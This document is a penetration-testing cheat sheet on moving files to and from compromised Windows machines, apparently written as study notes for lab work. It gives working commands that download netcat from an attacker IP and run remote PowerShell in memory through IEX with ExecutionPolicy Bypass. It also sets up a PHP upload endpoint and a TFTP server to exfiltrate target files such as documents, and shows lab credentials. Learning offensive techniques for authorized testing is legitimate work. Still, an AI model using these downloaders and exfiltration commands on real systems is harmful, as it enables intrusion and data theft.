## File Transfers

### Tools for receiving files

#### Netcat 

`sudo netcat -nvlp  8000 < sendfile `

#### Pureftpd 

Installation:

```bash
sudo apt update && sudo apt -y install pure-ftpd
# Add user & group to run process
sudo groupadd ftpgroup
sudo useradd -g ftpgroup -d /dev/null -s /etc ftpuser
# Create symblink
cd /etc/pure-ftpd/auth/
sudo ln -s ../conf/PureDB 60pdb
# Create FTP Directory
sudo mkdir -p /ftphome
# Set folder permissions
sudo chown -R ftpuser:ftpgroup /ftphome/
# Start process
sudo systemctl restart pure-ftpd
```

User management

My Kali Machine:  rock/roll

```bash
# Create user for FTP
sudo pure-pw useradd offsec -u ftpuser -d /ftphome
# Commit user changes (must be run after any user change)
sudo pure-pw mkdb
```

User information is stored in `/etc/pure-ftpd/pureftpd.passwd`

If you still can't authenticate, you may want to disable PAM:

`sudo echo no > /etc/pure-ftpd/conf/PAMAuthentication`

### Windows Tools in Kali

Kali contains a directory of useful tools to transfer and use on Windows found in `/usr/share/windows-resources/binaries/` such as:

- nc.exe
- wget.exe
- whoami.exe

### Transferring from Windows

#### Non-Interactive FTP Download

Use the default ftp client in Windows and a transfer script file to transfer a file using a non-interactive command:

1. Create a file on the Windows machine with the ftp commands in it:

   ```powershell
   echo open 192.168.119.216 21> ftp.txt
   echo USER rock>> ftp.txt
   echo roll>> ftp.txt
   echo bin >> ftp.txt
   echo GET nc.exe >> ftp.txt
   echo bye >> ftp.txt
   ```
   
2. Run the ftp command using the script file:

   ```bash
   ftp -v -n -s:ftp.txt
   # Options
   -v # Suppress any returned output
   -n # Suppress automatic login
   -s # Script file
   ```

#### Windows Scripting Languages

##### VBScript

Paste these into the shell to build the script:

```powershell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

Make sure to hit enter a couple of times to ensure all the commands were entered, then use this to run the script:

```powershell
cscript wget.vbs http://192.168.119.216/wget.exe wget.exe
```

### PowerShell

#### Building a PS Script

Paste these into the shell to build the script:

```powershell
echo $webclient = New-Object System.Net.WebClient >>wget.ps1
echo $url = "http://192.168.119.216/nc.exe" >>wget.ps1
echo $file = "new-exploit.exe" >>wget.ps1
echo $webclient.DownloadFile($url,$file) >>wget.ps1
```

Remember to hit enter to ensure all commands were entered.

Then run it with this command:

```powershell
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1

# Options
-ExecutionPolicy Bypass # Allows PS scripts to be run
-NoLogo # Hide powershell logo banner
-NonInteractive # Hide powershell prompt
-NoProfile # Don't load default profile
-File wget.ps1 # Specify script
```

#### PS One-Liner Download

This one liner will accomplish the same as the script above:

```powershell
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.119.216/nc.exe', 'new-exploit.exe')
```

An alternate one-liner for newer versions of PowerShell (3.0 & above)

```powershell
powershell.exe Invoke-WebRequest -uri 'http://192.168.119.216/upload.php' -Method Put -Infile 'nc.exe'
```

#### Run Remote Script

To download and run a script without storing it locally on the target, first create the script and host it somewhere accessible to the target, then run this:

```bash
powershell.exe IEX (New-Object System.Net.WebClient).DownloadString('http://192.168.119.216/helloworld.ps1')
```

#### exe2hex and Powershell

Not sure why we are doing this yet

First, optimize the size of the binary using upx:

```bash
upx -9 nc.exe
```

Next, convert the file to a Windows Script CMD format, which converts it to hex and tells Powershell to assemble it back into binary:

```bash
exe2hex -x nc.exe -p nc.cmd
```

Now copy the hex contents of the CMD file to the clipboard and paste it into the shell:

```bash
cat nc.cmd | xclip -selection clipboard

# Note, if using 'clipboard' won't paste, try 'primary' instead.
```

### Exfiltrating Data from Windows

#### Using Powershell

If you are using a Windows machine that is Win7/Win2008R2 and above inside your target organization and need to get data out, you can send it to the attacker machine via an HTTP post request.

Create this file on the attacker machine and host it on your webserver.

```php+HTML
<?php
$uploaddir = '/var/www/uploads/';
$uploadfile = $uploaddir . $_FILES['file']['name'];
move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
?>
```

You must also create the receiving folder and set permissions on it:

```bash
# Make folder
sudo mkdir /var/www/uploads
# Identify the Apache process user
ps -ef | grep apache
# Give apache's user ownership of the folder (ex: www-data)
sudo chown www-data: /var/www/uploads
```

WARNING:  Remember that anyone who interacts with this page can upload to your attacker machine while it is available.

Finally, run this command on Windows to send the files to your webserver:

```powershell
powershell (New-Object System.Net.WebClient).UploadFile('http://192.168.119.216/upload.php', 'important.docx')
```

#### Using TFTP

Although TFTP is not ideal, for older OS's like XP and Server 2003, where Powershell is not an option, TFTP can help out.

First, install tftp on the attacker machine:

```bash
sudo apt update && sudo apt install atftp
```

Next, create a folder to receive files and set permissions:

```bash
sudo mkdir /tftp
sudo chown nobody: /tftp
```

Finally, activate the tftp server:

```bash
sudo atftpd --daemon --port 69 /tftp
```

Now, from the Windows target, upload files to the attacker tftp server:

```powershell
tftp -i 192.168.119.216 put file.txt
```

BIG NOTE:  Windows Firewall could block this transfer due to tftp's handing off of the transfer to a high port.  You may need to allow tftp through Windows Firewall for this to work ü§¶üèª‚Äç‚ôÇÔ∏è

### More Techniques

For some incredibly interesting ways to use common Windows utilities for file operations, program execution, UAC bypass, and much more, see the Living Off The Land Binaries And Scripts (LOLBAS) project, maintained by Oddvar Moe and several contributors, which aims to ‚Äúdocument every binary, script, and library that can be used for [these] techniques.‚Äù For example, the certutil.exe
program can easily download arbitrary files and much more.  

https://github.com/LOLBAS-Project/LOLBAS